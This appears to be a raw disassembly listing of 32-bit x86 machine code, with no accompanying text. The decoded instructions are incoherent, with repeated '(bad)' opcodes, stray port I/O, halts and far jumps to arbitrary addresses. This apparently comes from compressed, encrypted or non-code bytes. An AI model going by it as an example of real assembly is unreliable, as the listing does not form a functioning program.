  42252c:	fnsave [edi+0x831a74f]
  422532:	push   ebp
  422533:	mov    edi,ebp
  422535:	push   es
  422536:	popf   
  422537:	div    BYTE PTR [edi+0x8]
  42253a:	cmc    
  42253b:	popf   
  42253c:	mov    cl,0x12
  42253e:	shl    DWORD PTR [ebx-0x1e],cl
  422541:	fsub   QWORD PTR [edx+0x3815c082]
  422547:	inc    edi
  422548:	bound  eax,QWORD PTR [eax-0x5b515012]
  42254e:	cld    
  42254f:	mov    ebp,0x809eb24c
  422554:	dec    ecx
  422555:	add    bh,BYTE PTR [esi+0x4c3b24f5]
  42255b:	addr16 cld 
  42255d:	mov    edi,0x35807ca
  422562:	hlt    
  422563:	inc    edx
  422564:	push   ebx
  422565:	xchg   DWORD PTR [eax],ecx
  422567:	pop    ds
  422568:	mov    ah,0x7e
  42256a:	push   ecx
  42256b:	or     eax,0x2dd7294a
  422570:	mov    edx,0x27de5255
  422575:	ret    0x37a7
  422578:	loopne 0x4224fe
  42257a:	add    BYTE PTR [edx+0x4f],dh
  42257d:	mul    BYTE PTR [edx]
  42257f:	out    dx,eax
  422580:	jmp    DWORD PTR [esi-0x21]
  422583:	pop    esp
  422584:	push   0xa5406035
  422589:	hlt    
  42258a:	jmp    0x422550
  42258c:	pop    edx
  42258d:	inc    ecx
  42258e:	rol    esi,cl
  422590:	adc    al,0x38
  422592:	cmc    
  422593:	es add al,0xc2
  422596:	mov    bh,BYTE PTR [ebx+0x39d9a4e2]
  42259c:	xchg   ebp,eax
  42259d:	neg    DWORD PTR [edi-0x7cc8fa65]
  4225a3:	xor    ch,BYTE PTR [esi+0x55]
  4225a6:	sbb    dl,cl
  4225a8:	jb     0x422624
  4225aa:	test   DWORD PTR [ebp-0x30db79f0],edi
  4225b0:	xor    al,BYTE PTR [eax+0x4dcd469f]
  4225b6:	add    DWORD PTR [esi+0x30],edi
  4225b9:	div    BYTE PTR [ecx]
  4225bb:	sar    DWORD PTR [ecx],1
  4225bd:	sbb    ebp,0x6700
	...
  422633:	add    BYTE PTR [ebx-0x105512d4],ch
  422639:	jmp    0x42262a
  42263b:	sub    eax,0xb720f321
  422640:	or     DWORD PTR fs:0x16f5c3a,0x0
  422648:	cmc    
  422649:	add    BYTE PTR [eax],al
  42264b:	add    BYTE PTR [eax+0x61],ah
  42264e:	hlt    
  42264f:	retf   
  422650:	jmp    0x6e46334a
  422655:	sti    
  422656:	mov    ch,0xa3
  422658:	xlat   BYTE PTR ds:[ebx]
  422659:	scas   al,BYTE PTR es:[edi]
  42265a:	xor    ch,BYTE PTR ds:[edx]
  42265d:	in     eax,dx
  42265e:	out    0xc1,al
  422660:	inc    edx
  422661:	push   ebp
  422662:	sub    al,0xff
  422664:	out    0x12,eax
  422666:	inc    ax
  422668:	mov    ch,0x3f
  42266a:	xchg   ebx,eax
  42266b:	call   0x3934:0x4f8fb1d9
  422672:	and    al,0xf4
  422674:	jb     0x42261f
  422676:	int3   
  422677:	and    BYTE PTR [ebx],0x40
  42267a:	mov    al,ds:0x78da897b
  42267f:	mov    edi,0x7de1dc80
  422684:	push   eax
  422685:	cmp    eax,0x8bb7f775
  42268a:	push   esp
  42268b:	inc    ebx
  42268c:	int3   
  42268d:	add    esi,0x40
  422690:	mov    ?,WORD PTR [esi]
  422692:	gs jbe 0x4226a8
  422695:	pusha  
  422696:	test   cl,0x79
  422699:	push   edx
  42269a:	(bad)  
  42269b:	jne    0x422623
  42269d:	imul   ebp,DWORD PTR [esi+eax*4+0x5d759c74],0x2391cff2
  4226a8:	es pop edx
  4226aa:	add    al,ch
  4226ac:	jno    0x422661
  4226ae:	popa   
  4226af:	jne    0x42272f
  4226b1:	push   es
  4226b2:	ja     0x4226d8
  4226b4:	repnz push ss
  4226b6:	jno    0x422719
  4226b8:	ret    0x412a
  4226bb:	in     al,dx
  4226bc:	cdq    
  4226bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226be:	fdivr  QWORD PTR [ebx]
  4226c0:	mov    dl,0xc
  4226c2:	jg     0x422666
  4226c4:	cmp    bh,BYTE PTR [edi-0x27d171d8]
  4226ca:	test   al,0x4b
  4226cc:	dec    esi
  4226cd:	adc    esi,DWORD PTR ds:0x501cb93f
  4226d3:	clc    
  4226d4:	push   esp
  4226d5:	add    eax,0x44fb3a29
  4226da:	pushf  
  4226db:	xchg   BYTE PTR [edx],al
  4226dd:	sti    
  4226de:	xor    al,0x1b
  4226e0:	aas    
  4226e1:	jl     0x422679
  4226e3:	fwait
  4226e4:	cmp    ebx,DWORD PTR [ebp+0x1d]
  4226e7:	rol    BYTE PTR [ebx+0x66a33225],1
  4226ed:	(bad)  
  4226ee:	cli    
  4226ef:	lds    ebp,FWORD PTR [ebx+0x69]
  4226f2:	fwait
  4226f3:	mov    esi,0x4c2a80d4
  4226f8:	repz pop eax
  4226fa:	sbb    eax,0x8660c78d
  4226ff:	dec    esi
  422700:	pushf  
  422701:	and    cl,BYTE PTR [esi+0x1b]
  422704:	or     al,0xb0
  422706:	jns    0x4226bb
  422708:	je     0x4226f7
  42270a:	mov    bh,0x87
  42270c:	push   esi
  42270d:	gs cdq 
  42270f:	pop    eax
  422710:	shr    esi,0x9b
  422713:	in     al,dx
  422714:	add    eax,0x2bd800ef
  422719:	xlat   BYTE PTR ds:[ebx]
  42271a:	(bad)  
  42271c:	dec    ecx
  42271d:	xchg   DWORD PTR [edi],ebx
  42271f:	jmp    0x2249a94c
  422724:	nop
  422725:	fdivp  st(1),st
  422727:	lods   al,BYTE PTR ds:[esi]
  422728:	retf   
  422729:	bound  ebx,QWORD PTR ds:0x96f4ccb0
  42272f:	mov    dh,0xb5
  422731:	xabort 0xbe
  422734:	nop
  422735:	jns    0x422731
  422737:	push   es
  422738:	retf   0x4e49
  42273b:	mov    ebp,0x6921ff11
  422740:	test   DWORD PTR [eax],eax
	...
  4227b2:	add    BYTE PTR [eax],al
  4227b4:	shl    DWORD PTR [eax-0x6061f47],1
  4227ba:	fnstenv [ecx-0x69b500ed]
  4227c0:	pusha  
  4227c1:	xor    dh,BYTE PTR [ebx+0x170512f]
  4227c7:	add    ch,dh
  4227c9:	add    BYTE PTR [eax],al
  4227cb:	add    BYTE PTR [ecx+0x63],al
  4227ce:	fidiv  WORD PTR [ebx]
  4227d0:	jg     0x4227fe
  4227d2:	dec    ecx
  4227d3:	pop    ss
  4227d4:	ja     0x422837
  4227d6:	push   ebx
  4227d7:	popf   
  4227d8:	jge    0x4227c3
  4227da:	imul   ebp,esp,0x3ba2d78e
  4227e0:	mov    eax,ds:0xe8115de6
  4227e5:	fistp  QWORD PTR [edx+ecx*4+0x32c600e5]
  4227ec:	ins    DWORD PTR es:[edi],dx
  4227ed:	mov    WORD PTR es:[edx],cs
  4227f0:	and    bh,BYTE PTR [ecx]
  4227f2:	js     0x422831
  4227f4:	imul   ebx,ebp,0xffffffc8
  4227f7:	mov    eax,ds:0x906f84af
  4227fc:	shr    DWORD PTR [ebx],1
  4227fe:	dec    ecx
  4227ff:	and    DWORD PTR [ebx-0x418e4514],esi
  422805:	add    eax,0x4dc31178
  42280a:	fcomp  DWORD PTR [esi+0x4c]
  42280d:	lock sub DWORD PTR [ebx+0x75ba43dd],edx
  422814:	xchg   dx,ax
  422816:	and    BYTE PTR [ebx+0x12e7d2ae],bl
  42281c:	mov    edx,0xce8d7b7c
  422821:	out    0x34,eax
  422823:	and    bh,BYTE PTR [ebx]
  422825:	jnp    0x42281c
  422827:	loopne 0x422896
  422829:	data16 mov dl,0x2f
  42282c:	test   al,0x29
  42282e:	mov    bh,0x59
  422831:	sub    al,0x17
  422833:	in     al,dx
  422834:	fcmovnb st,st(1)
  422836:	rcpps  xmm6,XMMWORD PTR [edx-0x1d]
  42283a:	xlat   BYTE PTR ds:[ebx]
  42283b:	mov    ds:0x2dbdbd03,al
  422840:	lods   eax,DWORD PTR ds:[esi]
  422841:	cmp    BYTE PTR [esi],0x3
  422844:	add    edi,DWORD PTR [ecx+0x361091ab]
  42284a:	mov    ecx,0xffe7c112
  42284f:	or     eax,0x87267887
  422854:	or     eax,0x8c3b317f
  422859:	repz (bad) 
  42285b:	call   0x32f1:0x220185f3
  422862:	xchg   edx,eax
  422863:	popf   
  422864:	dec    eax
  422865:	mov    al,ds:0xf703a066
  42286a:	or     al,0x7a
  42286c:	daa    
  42286d:	push   edx
  42286e:	idiv   BYTE PTR [ecx+0x2c60172c]
  422874:	cmp    DWORD PTR [edi+0x38cab5eb],ecx
  42287a:	sti    
  42287b:	fwait
  42287c:	out    dx,eax
  42287d:	and    al,0xa1
  42287f:	sar    DWORD PTR [edi],cl
  422881:	in     eax,0xb5
  422883:	scas   eax,DWORD PTR es:[edi]
  422884:	data16 jno 0x422835
  422887:	pusha  
  422888:	lods   al,BYTE PTR ds:[esi]
  422889:	xchg   esp,eax
  42288a:	inc    ebx
  42288b:	dec    edi
  42288c:	icebp  
  42288d:	mov    bl,0x71
  422890:	cli    
  422891:	pusha  
  422892:	jb     0x422850
  422894:	xchg   edi,eax
  422895:	int3   
  422896:	sbb    BYTE PTR [edx-0x5377dc21],ah
  42289c:	out    dx,al
  42289d:	jnp    0x422849
  42289f:	sub    al,0xda
  4228a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228a2:	imul   edx,edi,0x7a
  4228a5:	pop    ds
  4228a6:	xor    DWORD PTR [ebx-0x467e5b39],eax
  4228ac:	cs enter 0x6dd,0x3b
  4228b1:	push   0xffffffe2
  4228b3:	dec    ecx
  4228b4:	loope  0x42285a
  4228b6:	jmp    0x4228c8
  4228b8:	in     eax,dx
  4228b9:	leave  
  4228ba:	inc    ecx
  4228bb:	in     al,0x7e
  4228bd:	shr    BYTE PTR [eax],0xd8
  4228c0:	sbb    eax,DWORD PTR [eax]
	...
  422932:	add    BYTE PTR [eax],al
  422934:	(bad)  
  422935:	cld    
  422936:	je     0x422955
  422938:	jbe    0x4228d7
  42293a:	(bad)  
  42293b:	jmp    ebx
  42293d:	lea    ecx,[ebx]
  42293f:	xchg   esp,eax
  422940:	mov    ebp,0x46bdf9f1
  422945:	jno    0x422948
  422947:	add    ch,dh
  422949:	add    BYTE PTR [eax],al
  42294b:	add    BYTE PTR [ecx],bl
  42294d:	jl     0x42297f
  42294f:	ror    DWORD PTR [ecx],0x2f
  422952:	fcmovnu st,st(6)
  422954:	addr16 icebp 
  422956:	fwait
  422957:	sub    DWORD PTR [ebx+0x5aa6ae4],edi
  42295d:	cwde   
  42295e:	ror    DWORD PTR [edi-0x7f107399],1
  422964:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422965:	push   0x71
  422967:	stos   BYTE PTR es:[edi],al
  422968:	add    al,0x2e
  42296a:	clc    
  42296b:	ja     0x422971
  42296d:	cs pop esp
  42296f:	and    DWORD PTR [edi],esi
  422971:	and    al,0xce
  422973:	xchg   esp,eax
  422974:	sub    eax,DWORD PTR [edx]
  422976:	outs   dx,DWORD PTR ds:[esi]
  422977:	sbb    eax,0xeff539db
  42297c:	mov    al,ds:0x3f963715
  422981:	jne    0x422996
  422983:	cmp    al,0xd
  422985:	xchg   ebp,eax
  422986:	mov    eax,esp
  422988:	jge    0x4229b3
  42298a:	test   eax,0x5500f089
  42298f:	ins    BYTE PTR es:[edi],dx
  422990:	jecxz  0x4229ef
  422992:	xor    BYTE PTR [eax+ecx*2],cl
  422995:	add    BYTE PTR [ebp-0x23],dh
  422998:	icebp  
  422999:	adc    dl,BYTE PTR ds:0xc6c896e9
  42299f:	sub    DWORD PTR [ebp*1-0x57880e9d],0xab5eb383
  4229aa:	ja     0x422982
  4229ac:	mov    ch,0x72
  4229ae:	adc    eax,ebx
  4229b0:	and    al,0x28
  4229b2:	or     BYTE PTR [ebx-0x11],ah
  4229b5:	or     eax,0x98922084
  4229ba:	add    al,0xdf
  4229bc:	shl    dh,cl
  4229be:	popf   
  4229bf:	(bad)  
  4229c0:	or     al,BYTE PTR ss:[esi+0x6]
  4229c4:	inc    eax
  4229c5:	jle    0x42297f
  4229c7:	in     al,dx
  4229c8:	mov    dh,0x4b
  4229ca:	mov    ch,al
  4229cc:	push   esi
  4229cd:	aas    
  4229ce:	aad    0x3
  4229d0:	add    BYTE PTR [edi-0x19c6c8ae],ah
  4229d6:	outs   dx,BYTE PTR ds:[esi]
  4229d7:	jp     0x422990
  4229d9:	enter  0x922e,0xd0
  4229dd:	xchg   esp,eax
  4229de:	xlat   BYTE PTR ds:[ebx]
  4229df:	mov    DWORD PTR [ebp-0x3625e117],ebp
  4229e5:	inc    eax
  4229e6:	in     eax,0x7
  4229e8:	push   edx
  4229e9:	test   al,0xef
  4229eb:	or     edx,edx
  4229ed:	int3   
  4229ee:	mov    WORD PTR [ebx-0x7222f96e],?
  4229f4:	cmp    al,0x3
  4229f6:	in     eax,dx
  4229f7:	sub    eax,0xdd096d41
  4229fc:	pop    ebp
  4229fd:	mov    edx,0xd2d33035
  422a02:	popa   
  422a03:	out    dx,al
  422a04:	adc    DWORD PTR [ebp-0x16ce41c6],ecx
  422a0a:	add    esi,DWORD PTR [esi-0x46]
  422a0d:	xchg   esi,eax
  422a0e:	fisubr WORD PTR [ebp*2+0x4fbb0ce3]
  422a15:	dec    esp
  422a16:	popa   
  422a17:	mov    ecx,0x746be0a2
  422a1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a1d:	inc    ebp
  422a1e:	addr16 push esp
  422a20:	adc    esp,DWORD PTR [ecx-0x2f]
  422a23:	adc    ebx,esp
  422a25:	cmp    ebx,DWORD PTR [edi-0x49]
  422a28:	fs sbb esi,eax
  422a2b:	xchg   edx,eax
  422a2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a2d:	xchg   esp,eax
  422a2e:	sub    bh,0xbb
  422a31:	out    0x35,al
  422a33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a34:	ins    DWORD PTR es:[edi],dx
  422a35:	loope  0x4229cb
  422a37:	xchg   eax,esp
  422a39:	clc    
  422a3a:	out    dx,eax
  422a3b:	sti    
  422a3c:	ss mov esi,0xc4de47
	...
  422ab2:	add    BYTE PTR [eax],al
  422ab4:	push   ss
  422ab5:	cdq    
  422ab6:	jmp    0x37401a88
  422abb:	fcmovnbe st,st(0)
  422abd:	cld    
  422abe:	xor    al,0xd0
  422ac0:	jno    0x422a9a
  422ac2:	dec    ebx
  422ac3:	mov    ecx,0x1723b
  422ac8:	cmc    
  422ac9:	add    BYTE PTR [eax],al
  422acb:	add    BYTE PTR [ecx-0x79],dl
  422ace:	aad    0x82
  422ad0:	dec    ebp
  422ad1:	jne    0x422ade
  422ad3:	xchg   BYTE PTR [edi-0x15],bh
  422ad6:	cld    
  422ad7:	xor    esi,0xffffffaa
  422ada:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422adb:	mov    ah,0x87
  422add:	jmp    0x4e56a073
  422ae2:	gs push ds
  422ae4:	idiv   BYTE PTR [esi+0x5b]
  422ae7:	pop    edx
  422ae8:	mov    ss,WORD PTR ds:0xa73e1d60
  422aee:	je     0x422b48
  422af0:	bound  edi,QWORD PTR ds:0xcdb3cfc3
  422af6:	fmul   DWORD PTR [edi+0x2e812441]
  422afc:	jge    0x422af7
  422afe:	jbe    0x422b14
  422b00:	add    eax,0x9940f055
  422b05:	mov    bl,ch
  422b07:	push   ebx
  422b08:	xchg   BYTE PTR [ebx-0x7b4eba51],dh
  422b0e:	pop    edx
  422b0f:	outs   dx,BYTE PTR ds:[esi]
  422b10:	mov    ch,0xcf
  422b12:	pop    ebx
  422b13:	inc    edx
  422b14:	cmc    
  422b15:	mov    al,ds:0xbc2ae648
  422b1a:	out    0x28,al
  422b1c:	test   eax,0xb243795b
  422b21:	adc    eax,0x23963a9c
  422b26:	aam    0x9e
  422b28:	mov    esp,0x90819aa9
  422b2d:	mov    al,ds:0x8ba5b358
  422b32:	sbb    al,0xca
  422b34:	fild   DWORD PTR [edi-0x6fa3d3f2]
  422b3a:	lods   al,BYTE PTR ds:[esi]
  422b3b:	icebp  
  422b3c:	cli    
  422b3d:	sub    bl,0xf8
  422b40:	adc    DWORD PTR [ebx+0x22],edx
  422b43:	pop    eax
  422b44:	retf   
  422b45:	mov    bh,0xd5
  422b47:	fcomp  QWORD PTR [ecx+0x6f]
  422b4a:	mov    ch,0x85
  422b4c:	loop   0x422b45
  422b4e:	adc    eax,0x2dac2e68
  422b53:	lea    ecx,[eax+esi*1]
  422b56:	rcr    esp,1
  422b58:	cmp    dh,BYTE PTR [ebx+0x473acb6d]
  422b5e:	push   es
  422b5f:	in     al,dx
  422b60:	or     DWORD PTR [ebx],ebp
  422b62:	ja     0x422af5
  422b64:	ds sub eax,0x93f9d05b
  422b6a:	jbe    0x422b13
  422b6c:	retf   0xa46c
  422b6f:	adc    ah,0x55
  422b72:	daa    
  422b73:	sub    bl,dl
  422b75:	(bad)
  422b79:	jmp    0xa91e:0xcdfb439b
  422b80:	shr    DWORD PTR [eax-0x12d69b05],cl
  422b86:	xchg   edx,eax
  422b87:	xor    DWORD PTR [eax],ebx
  422b89:	loop   0x422b20
  422b8b:	scas   al,BYTE PTR es:[edi]
  422b8c:	mov    ecx,0x60a92e9f
  422b91:	push   esp
  422b92:	cli    
  422b93:	int3   
  422b94:	inc    esi
  422b95:	xchg   BYTE PTR [esi],cl
  422b97:	mov    dh,0xb0
  422b99:	xor    al,0x40
  422b9b:	dec    edx
  422b9c:	outs   dx,DWORD PTR ds:[si]
  422b9e:	ret    
  422b9f:	push   eax
  422ba0:	or     DWORD PTR [edi],ebp
  422ba2:	aam    0x9d
  422ba4:	sbb    eax,0xe1700a45
  422ba9:	call   0xca2a4b30
  422bae:	int    0x49
  422bb0:	sbb    eax,0xf35ef8a7
  422bb5:	ins    BYTE PTR es:[edi],dx
  422bb6:	rcl    DWORD PTR [ecx+0x2e01069b],1
  422bbc:	hlt    
  422bbd:	xor    al,0xa9
  422bbf:	retf   
  422bc0:	mov    ah,0x0
	...
  422c32:	add    BYTE PTR [eax],al
  422c34:	mov    al,0x6b
  422c36:	mov    ch,0xe5
  422c38:	(bad)  
  422c39:	push   eax
  422c3b:	jg     0x422c9e
  422c3d:	pop    es
  422c3e:	jne    0x422bca
  422c40:	inc    ebp
  422c41:	mov    esp,0x73304140
  422c46:	add    DWORD PTR [eax],eax
  422c48:	cmc    
  422c49:	add    BYTE PTR [eax],al
  422c4b:	add    cl,bl
  422c4d:	or     eax,0x9c1b682c
  422c52:	jbe    0x422c60
  422c54:	leave  
  422c55:	hlt    
  422c56:	or     DWORD PTR [ebp-0x50],ecx
  422c59:	mov    ds:0x3ee15057,eax
  422c5e:	fnstsw WORD PTR [esi]
  422c60:	outs   dx,DWORD PTR ds:[esi]
  422c61:	mov    ch,0xd1
  422c63:	sub    eax,0xf23a585
  422c68:	add    al,0xf6
  422c6a:	and    al,0xcf
  422c6c:	out    0x8a,al
  422c6e:	jnp    0x422bf9
  422c70:	fisttp DWORD PTR [edi+0x7439568e]
  422c76:	mov    dl,0x67
  422c78:	test   eax,0x5a001ad6
  422c7d:	ja     0x422ce1
  422c7f:	into   
  422c80:	dec    ebp
  422c81:	int    0xb2
  422c83:	ins    BYTE PTR es:[edi],dx
  422c84:	xor    edi,DWORD PTR [esi-0x4e]
  422c87:	clc    
  422c88:	sbb    al,0x16
  422c8a:	push   ebx
  422c8b:	inc    eax
  422c8c:	add    cl,BYTE PTR [eax+eax*1-0x19]
  422c90:	jl     0x422c54
  422c92:	stc    
  422c93:	push   ds
  422c94:	sub    ebx,ebp
  422c96:	shl    DWORD PTR [esi],1
  422c98:	fidiv  WORD PTR [edi-0x4675d511]
  422c9e:	xchg   ebp,eax
  422c9f:	push   0x818882bf
  422ca4:	pop    ds
  422ca5:	rcl    BYTE PTR [ebp+0x5ea426d2],cl
  422cab:	xchg   ebp,eax
  422cac:	es enter 0x6ee8,0xa4
  422cb1:	dec    esi
  422cb2:	out    dx,al
  422cb3:	xchg   esp,eax
  422cb4:	pop    edi
  422cb5:	and    eax,0x5a1f9e3e
  422cba:	push   es
  422cbb:	sar    dh,cl
  422cbd:	ins    BYTE PTR es:[edi],dx
  422cbe:	iret   
  422cbf:	fist   DWORD PTR [ecx+0x2c]
  422cc2:	add    BYTE PTR [edi+0x7f],al
  422cc5:	mov    esi,0xfeebe095
  422cca:	daa    
  422ccb:	jbe    0x422ccb
  422ccd:	mov    DWORD PTR [ebx-0x34876de5],eax
  422cd3:	mov    dl,0xfd
  422cd5:	out    0xdf,al
  422cd7:	sub    BYTE PTR [ecx],0x71
  422cda:	jbe    0x422d02
  422cdc:	mov    esi,0xca315e4c
  422ce1:	lea    ebp,[edx+0x2c]
  422ce4:	shl    esi,0x3c
  422ce7:	call   0x9bb0:0xedfbe63
  422cee:	xchg   edi,eax
  422cef:	sub    ch,ch
  422cf1:	cli    
  422cf2:	cmp    BYTE PTR [eax+ebp*1-0x7b],cl
  422cf6:	ror    DWORD PTR [eax+0x4a1d5835],1
  422cfc:	mov    al,ds:0x56b4d28
  422d01:	stos   DWORD PTR es:[edi],eax
  422d02:	aaa    
  422d03:	std    
  422d04:	adc    ebx,0xc958119d
  422d0a:	or     al,BYTE PTR [ebx-0x59]
  422d0d:	ss push ebp
  422d0f:	mov    al,0x5d
  422d11:	xchg   edi,eax
  422d12:	add    ecx,edx
  422d14:	std    
  422d15:	sbb    ch,0x2
  422d18:	repz in eax,dx
  422d1a:	fwait
  422d1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d1c:	repnz (bad) 
  422d1e:	sbb    al,BYTE PTR [ebp-0x1e]
  422d21:	cmc    
  422d22:	in     al,0x32
  422d24:	add    eax,0xffe4f0a6
  422d29:	ret    
  422d2a:	ins    DWORD PTR es:[edi],dx
  422d2b:	and    eax,0xf89b88e8
  422d30:	push   esi
  422d31:	sbb    DWORD PTR [eax+0x555825f5],eax
  422d37:	pop    edx
  422d38:	mov    dl,BYTE PTR [esi]
  422d3a:	pmaddwd mm7,QWORD PTR [ebx]
  422d3d:	fidiv  WORD PTR [ecx+0x73c2]
	...
  422db3:	add    bh,cl
  422db5:	mov    eax,ds:0xbf7f851b
  422dba:	fucomip st,st(3)
  422dbc:	addr16 mov ecx,0x3d9df9f7
  422dc2:	retf   
  422dc3:	push   esi
  422dc4:	and    eax,0xf5000174
  422dc9:	add    BYTE PTR [eax],al
  422dcb:	add    BYTE PTR [ebx],dh
  422dcd:	aas    
  422dce:	cld    
  422dcf:	cld    
  422dd0:	shr    DWORD PTR [ebx],cl
  422dd2:	fsubr  QWORD PTR [ebp-0x7a]
  422dd5:	fwait
  422dd6:	adc    edi,DWORD PTR [eax]
  422dd8:	mov    ecx,0x79f3de77
  422ddd:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ddf:	cmp    al,0x98
  422de1:	add    BYTE PTR [eax+0x55],al
  422de4:	adc    dh,BYTE PTR [ebp+0x457dcd8f]
  422dea:	cmp    bh,BYTE PTR [esi+0x27]
  422ded:	test   al,0x56
  422def:	mov    bh,0x9c
  422df1:	mov    dh,0x94
  422df3:	xor    eax,0x28697271
  422df8:	dec    ebx
  422df9:	xor    al,0xf4
  422dfb:	sub    DWORD PTR [ebp+eiz*1+0x450d7180],eax
  422e02:	sub    BYTE PTR [ebx-0x148ee522],bh
  422e08:	jmp    0x3bdc:0x7265377f
  422e0f:	xchg   esi,eax
  422e10:	inc    eax
  422e11:	sub    ecx,DWORD PTR [edx-0x17]
  422e14:	int3   
  422e15:	dec    ebx
  422e16:	pop    eax
  422e17:	push   DWORD PTR [ebx]
  422e19:	cmp    BYTE PTR [edx+edx*2+0x5952b0a1],ch
  422e20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e21:	gs sti 
  422e23:	sbb    dl,bl
  422e25:	mov    ecx,0x99d8282a
  422e2a:	out    dx,eax
  422e2b:	xor    DWORD PTR [eax+ebx*2],esp
  422e2e:	call   0xb944:0x1e288ccf
  422e35:	mov    BYTE PTR [ebp-0x49],dl
  422e38:	les    esp,FWORD PTR [ecx+0x44856c0a]
  422e3e:	call   0xdaa66f47
  422e43:	xchg   ecx,eax
  422e44:	mov    ch,0x4a
  422e46:	sbb    DWORD PTR [edx-0x6c],edi
  422e49:	mov    esp,0xdc3cbc88
  422e4e:	lods   eax,DWORD PTR ds:[esi]
  422e4f:	xchg   edi,eax
  422e50:	cmp    dl,BYTE PTR [edi+0x18]
  422e53:	and    BYTE PTR [ecx-0x9],0x5b
  422e57:	bound  ecx,QWORD PTR [edi+edx*1]
  422e5a:	adc    al,0x89
  422e5c:	mul    al
  422e5e:	push   ss
  422e5f:	repz pop edx
  422e61:	pushf  
  422e62:	leave  
  422e63:	test   DWORD PTR [edi+0x26],esi
  422e66:	push   ss
  422e67:	lock lods eax,DWORD PTR ds:[esi]
  422e69:	or     eax,0x1fbd8294
  422e6e:	adc    DWORD PTR [edi+0x1c],0x818d501e
  422e75:	mov    ebx,DWORD PTR [edi+0x47]
  422e78:	ins    DWORD PTR es:[edi],dx
  422e79:	data16 fild WORD PTR [ecx-0x15]
  422e7d:	xor    edx,esi
  422e7f:	ret    
  422e80:	xlat   BYTE PTR ds:[ebx]
  422e81:	mov    ah,0xdd
  422e83:	jge    0x422e07
  422e85:	and    al,0xa1
  422e87:	in     eax,0x5e
  422e89:	xchg   ebp,eax
  422e8a:	sbb    BYTE PTR [eax],dh
  422e8c:	stos   DWORD PTR es:[edi],eax
  422e8d:	add    edx,DWORD PTR [eax+0x4e]
  422e90:	cmp    ch,BYTE PTR [edi]
  422e92:	aaa    
  422e93:	pop    es
  422e94:	jnp    0x422efc
  422e96:	shl    BYTE PTR [ebp+0x70],cl
  422e99:	xchg   esp,eax
  422e9a:	mov    cl,0x8e
  422e9c:	shr    edi,1
  422e9e:	sub    al,0x4a
  422ea0:	and    cl,BYTE PTR [ecx]
  422ea2:	loop   0x422e79
  422ea4:	mov    BYTE PTR es:[ebp-0x298094a0],cl
  422eab:	and    al,BYTE PTR [ebp+0x3071cd18]
  422eb1:	add    BYTE PTR [ebx],dh
  422eb3:	ret    0xac24
  422eb6:	mov    ecx,0x539741e2
  422ebb:	jno    0x422e6a
  422ebd:	xor    DWORD PTR [ebp+0xec9e],0x0
	...
  422f33:	add    BYTE PTR [ebx+0x6],ch
  422f36:	(bad)  
  422f37:	dec    edi
  422f38:	out    dx,eax
  422f39:	iret   
  422f3a:	jmp    0x422f62
  422f3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f3d:	addr16 fs add dl,dl
  422f41:	sbb    BYTE PTR [eax],0x9a
  422f44:	sbb    dh,BYTE PTR [ebp+0x1]
  422f47:	add    ch,dh
  422f49:	add    BYTE PTR [eax],al
  422f4b:	add    BYTE PTR [edx+0x77],al
  422f4e:	mov    ebx,0x32dd3584
  422f53:	add    DWORD PTR [edx+0x1f],ecx
  422f56:	jae    0x422ef9
  422f58:	mov    ebp,0x138c6ff1
  422f5d:	pop    ds
  422f5e:	ror    DWORD PTR [esi],0x31
  422f61:	cmc    
  422f62:	in     al,dx
  422f63:	(bad)  
  422f64:	push   ebx
  422f65:	mov    bh,0x6a
  422f67:	sbb    eax,0xeb289670
  422f6c:	xchg   DWORD PTR [ebx-0x667ae743],edx
  422f72:	mov    ebp,0x58cf4aa6
  422f77:	dec    ebp
  422f78:	sti    
  422f79:	mov    ch,0xee
  422f7b:	dec    esi
  422f7c:	cld    
  422f7d:	sub    al,0x61
  422f7f:	fld    DWORD PTR [edi]
  422f81:	dec    BYTE PTR ds:0xbb4ebe
  422f87:	and    DWORD PTR [edi-0x6eeadc89],esi
  422f8d:	jno    0x422f7b
  422f8f:	sti    
  422f90:	clc    
  422f91:	aam    0xaa
  422f93:	mov    BYTE PTR [eax-0x10ad7ecb],dl
  422f99:	mov    al,0x6
  422f9b:	arpl   bx,cx
  422f9d:	mov    eax,fs:0xcb159a47
  422fa3:	rcr    bl,1
  422fa5:	xchg   esi,eax
  422fa6:	xchg   ebp,eax
  422fa7:	mov    bh,0x6
  422fa9:	outs   dx,BYTE PTR ds:[esi]
  422faa:	pop    ebx
  422fab:	cmp    al,0x49
  422fad:	cli    
  422fae:	jg     0x422faf
  422fb0:	adc    edi,ebp
  422fb2:	push   esp
  422fb3:	addr16 sti 
  422fb5:	nop
  422fb6:	gs jne 0x422fda
  422fb9:	and    DWORD PTR [eax+eax*2-0x59],esp
  422fbd:	inc    ecx
  422fbe:	xchg   BYTE PTR [eax+edx*4],dh
  422fc1:	js     0x422f91
  422fc3:	loope  0x422fb9
  422fc5:	in     al,dx
  422fc6:	pushf  
  422fc7:	fstp   QWORD PTR [esi-0x3fa22976]
  422fcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422fce:	inc    esi
  422fcf:	inc    edi
  422fd0:	dec    ebx
  422fd1:	xchg   edi,eax
  422fd2:	cmp    dh,BYTE PTR [edi+0x4bdcd1a5]
  422fd8:	mov    edx,ebx
  422fda:	aam    0xf7
  422fdc:	ds inc eax
  422fde:	out    dx,al
  422fdf:	mov    ecx,es
  422fe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422fe2:	cmp    ch,BYTE PTR [ebx]
  422fe4:	jmp    0x42300e
  422fe6:	dec    ebx
  422fe7:	stos   BYTE PTR es:[edi],al
  422fe8:	xor    DWORD PTR [ebx],esp
  422fea:	mov    ecx,0x753eb990
  422fef:	sbb    ebp,DWORD PTR [ebx+0x150c6a6b]
  422ff5:	shr    bl,cl
  422ff7:	dec    ebx
  422ff8:	cmp    DWORD PTR [eax+ecx*1+0x3da17f91],ebp
  422fff:	popf   
  423000:	es pop ebx
